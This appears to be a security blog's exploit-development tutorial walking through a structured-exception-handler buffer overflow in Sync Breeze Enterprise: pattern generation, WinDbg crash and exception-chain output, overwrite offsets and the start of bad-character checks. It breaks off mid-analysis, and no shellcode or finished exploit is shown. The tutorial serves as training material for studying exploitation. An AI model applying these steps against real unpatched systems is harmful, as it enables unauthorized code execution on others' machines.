<!DOCTYPE html>
<html class="" lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
        <script>
            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
        </script>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='http://localhost:1313/favicon.png'
/>
<link
    rel="shortcut icon"
    href='http://localhost:1313/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='http://localhost:1313/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='http://localhost:1313/favicon.png'
        type="image/svg+xml"
    />

<title>
        
        purpurina - a place for hacking
    </title>

    
    <link href="http://localhost:1313/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
    <link href="http://localhost:1313/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>

    
    
    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.b88203936c598b692d9cbebd7da89eb34e544b8522ae4c14ca657761be96b80c2acee8e6631de04d99ee1bdbc1bcad4a3add6f47a2366f4a29e2c531782be1a8.css integrity="sha512-uIIDk2xZi2ktnL69faies05US4UirkwUymV3Yb6WuAwqzujmYx3gTZnuG9vBvK1KOt1vR6I2b0op4sUxeCvhqA==" />
<meta name="author" content="jaco" />

    
    
        <meta name="description" content="h-overflow-exploit-step-by-step&#34;&gt;Our first SEH overflow exploit, step by step&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s start supposing that we already know that our input buffer crashes the program and somehow reaches any of the &lt;code&gt;_EXCEPTION_REGISTRATION_RECORD&lt;/code&gt; structures.
Let&amp;rsquo;s create a pattern in KALI to see the length of our buffer until it reaches the structure:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msf-pattern_create -l &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;              
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s paste this pattern and send this next to the headers needed so our payload is processed. Sending only this payload is useless as we want the program to process the input.
With 1000 characters, the program crashes:&lt;/p&gt;" />
    

<meta property="og:site_name"
    content='purpurina - a place for hacking' />

    <meta property="og:title" content="" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="jaco" />
    <meta
        property="article:published_time"
        content='0001-01-01T00:00:00Z&#43;0000' />
    
    <meta property="og:url" content="http://localhost:1313/posts/osed_seh_2/" />
    
    
    <meta property="og:image"
        content="http://localhost:1313/icon512.png" />
    
        <meta property="og:description" content="&lt;h1 id=&#34;our-first-seh-overflow-exploit-step-by-step&#34;&gt;Our first SEH overflow exploit, step by step&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s start supposing that we already know that " />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='localhost:1313'
/>
<meta property="twitter:url" content="http://localhost:1313/posts/osed_seh_2/" />


    <meta name="twitter:title" content="" />
    
    
    
    <meta name="twitter:image"
        content="http://localhost:1313/icon512.png" />
    
        <meta name="twitter:description" content="&lt;h1 id=&#34;our-first-seh-overflow-exploit-step-by-step&#34;&gt;Our first SEH overflow exploit, step by step&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s start supposing that we already know that " />
    

<link rel="manifest" href="http://localhost:1313/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="http://localhost:1313/">
                    <img src='http://localhost:1313/logo.jpg' alt='Logo'/>
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="http://localhost:1313/">purpurina - a place for hacking</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="http://localhost:1313/">Home</a></li>
        
            <li><a href="http://localhost:1313/posts/">Posts</a></li>
        
        
        
        
        
        
            <li><a href="http://localhost:1313/about/">About</a></li>
        
        
            <li><a href="http://localhost:1313/tags/">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search/?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        
        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">
    
    
        &#xf0e1;
    
    <span>
        LinkedIn
    </span>
</a>

    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1></h1>
    
    
        <p class="date">
            <span title='Date'>ï—¬ </span>
    0001-01-01

</p>
    
    
    
    
    <div><h1 id="our-first-seh-overflow-exploit-step-by-step">Our first SEH overflow exploit, step by step</h1>
<p>Let&rsquo;s start supposing that we already know that our input buffer crashes the program and somehow reaches any of the <code>_EXCEPTION_REGISTRATION_RECORD</code> structures.
Let&rsquo;s create a pattern in KALI to see the length of our buffer until it reaches the structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_create -l <span style="color:#ae81ff">1000</span>              
</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
</span></span></code></pre></div><p>Let&rsquo;s paste this pattern and send this next to the headers needed so our payload is processed. Sending only this payload is useless as we want the program to process the input.
With 1000 characters, the program crashes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(<span style="color:#ae81ff">1794.19f</span><span style="color:#ae81ff">0</span>)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span><span style="color:#f92672">***</span> WARNING: Unable to verify checksum <span style="color:#66d9ef">for</span> C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>libpal.dll
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">63413163</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>affa0c ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>afff08 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>aff9c4 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>afff08 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>affb10
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">932</span>a9d esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>aff998 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>affeb8 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010206</span>
</span></span><span style="display:flex;"><span>libpal<span style="color:#f92672">!</span>SCA_ConfigObj<span style="color:#f92672">::</span>Deserialize<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">932</span>a9d ff5024          call    dword ptr [eax<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>h]  ds:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">63413187</span><span style="color:#f92672">=????????</span>
</span></span></code></pre></div><p>We need to see at what address does our <code>EXCEPTION_REGISTRATION_RECORD</code> structures point to.
Let&rsquo;s list the exception chains:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>exchain
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span>affe0c: libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">149f</span>b (<span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span>adf5b)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span>afff44: <span style="color:#ae81ff">33654132</span>
</span></span><span style="display:flex;"><span>Invalid exception stack at <span style="color:#ae81ff">65413165</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">00366000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">00</span>affe0c
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">00</span>b00000
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">00</span>aff000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">00366000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">000017</span><span style="color:#ae81ff">94</span> . <span style="color:#ae81ff">000019f</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">005</span><span style="color:#ae81ff">87898</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">00354000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>affe0c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x00afff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x009adf5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>afff44
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x65413165</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x33654132</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">33654132</span>
</span></span></code></pre></div><p>We can see that the second record generated an error:</p>
<ul>
<li>The &ldquo;Next&rdquo; pointer points to an invalid address (65413165), which gives an invalid exception stack error.</li>
<li>The Handler is also overwritten as it is placed after the &ldquo;Next&rdquo; parameter in the stack.
Let&rsquo;s verify that both values have been overwritten with our buffer:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_offset -l <span style="color:#ae81ff">1000</span> -q <span style="color:#ae81ff">33654132</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">128</span>
</span></span><span style="display:flex;"><span>                                                                                                                                                     
</span></span><span style="display:flex;"><span>msf-pattern_offset -l <span style="color:#ae81ff">1000</span> -q 0x65413165 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">124</span>
</span></span></code></pre></div><p>We can see that we managed to overwrite both values.
So our payload is 128 bytes (in order to overwrite both values).
Let&rsquo;s put 124 &ldquo;A&rdquo;, 4 &ldquo;B&rdquo; (which will overwrite the Next value) and another 4 &ldquo;C&rdquo; (which will overwrite the Handler value).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span><span style="color:#ae81ff">82000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0185f</span>e14
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01</span><span style="color:#ae81ff">860000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">0185f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span><span style="color:#ae81ff">82000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00001</span>b28 . <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">828</span>
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">005f</span>a6d8
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">00376000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0185f</span>e14
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0185ff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x0096dce3</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0185ff</span><span style="color:#ae81ff">44</span> 
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x42424242</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x43434343</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">43434343</span>
</span></span></code></pre></div><p>As we can see, we managed to overwrite both values.
We want to overwrite only the &ldquo;Handler&rdquo; value so we will add 128 bytes (the next 4 will overwrite the handle address).</p>
<p>Let&rsquo;s continue by deleting the bad characters.
Update the payload to add the badchars after the 128 bytes.
Also, let&rsquo;s add more bytes so the overflow is triggered (<strong>At this point I don&rsquo;t know why, but, when adding the badchars after the 128 bytes that previously crashed the binary, it does not crash anymore. I guess it&rsquo;s because of the badchars. We have to add more bytes AFTER the badchars so it crashes and we can inspect badchars</strong>)
Once we have updated the payload, we have to inspect the part of the stack where our payload is stored.
If we remember, the same location where the <code>EXCEPTION_REGISTRATION_RECORD</code> pointed to is where the payload is stored. Let&rsquo;s check:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">00224000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0171f</span>e0c
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01720000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">0171f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">00224000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00000630</span> . <span style="color:#ae81ff">00000</span>ce4
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0062</span><span style="color:#ae81ff">9628</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">0021</span><span style="color:#ae81ff">9000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0171f</span>e0c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0171ff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x0089df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>Let&rsquo;s access the address of such record which is fully overwritten:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0x0171ff44</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">42424242</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">00000001</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">00</span><span style="color:#ae81ff">8507</span>ec libpal<span style="color:#f92672">!</span>SCA_TcpServer<span style="color:#f92672">::</span>CommandCallback<span style="color:#f92672">+</span><span style="color:#ae81ff">0xdc</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">54</span>  <span style="color:#ae81ff">00853e10</span> libpal<span style="color:#f92672">!</span>SCA_WinFile<span style="color:#f92672">::</span>operator<span style="color:#f92672">=+</span><span style="color:#ae81ff">0xe50</span>
</span></span></code></pre></div><p>After the payload we se a &ldquo;0000001&rdquo; value, let&rsquo;s inspect what happened:</p>
